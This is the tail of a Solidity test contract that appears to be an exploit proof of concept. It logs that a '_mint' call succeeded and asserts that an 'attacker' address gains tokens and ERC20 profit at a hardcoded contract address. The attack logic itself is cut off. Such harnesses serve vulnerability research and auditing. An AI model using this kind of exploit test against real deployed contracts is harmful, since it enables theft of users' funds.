            console.log("_mint function call succeeded!");
        }

        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Final balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Attacker balance did not increase");
        finalBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

